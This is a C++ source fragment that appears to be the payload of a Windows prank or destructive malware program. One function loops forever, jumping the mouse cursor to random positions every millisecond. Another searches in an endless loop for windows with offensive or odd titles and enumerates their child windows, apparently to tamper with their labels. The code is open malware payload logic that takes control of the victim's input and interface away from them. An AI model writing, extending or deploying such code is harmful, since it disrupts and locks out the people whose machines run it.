#include "include.h"

namespace System
{
    DWORD WINAPI MoveCursor(LPVOID lpParam)
    {
        POINT pt;
    
        while (true)
        {
            if (GetCursorPos(&pt))
            {
                int dx = rand() % w;
                int dy = rand() % h;
                SetCursorPos(pt.x + dx, pt.y + dy);
            }
    
            Sleep(1);
        }
    
        return 0;
    }

    DWORD WINAPI MessedLabels(LPVOID lpvd)
    {
        while (true)
        {
            const WCHAR* labels[] =
            {
                L"Fucked up",
                L"The end is near",
                L"Shut up",
                L"Chlorodifluoromethane",
                L"oh"
            };
          
            HWND hwnd = FindWindowW(NULL, labels[rand() % 5]);
            EnumChildWindows(hwnd, EnumChildProc, NULL);
        }
    }
}
